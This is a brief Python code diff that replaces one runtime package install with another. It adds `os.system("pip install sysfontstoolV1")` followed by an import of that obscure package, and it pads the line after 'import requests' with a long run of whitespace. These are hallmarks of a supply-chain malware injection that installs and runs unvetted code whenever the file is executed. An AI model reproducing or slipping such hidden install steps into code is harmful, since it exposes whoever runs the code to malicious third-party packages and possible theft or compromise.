@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlite3extV2")
-import pysqlite3extV2
+os.system("pip install sysfontstoolV1")
+import sysfontstoolV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
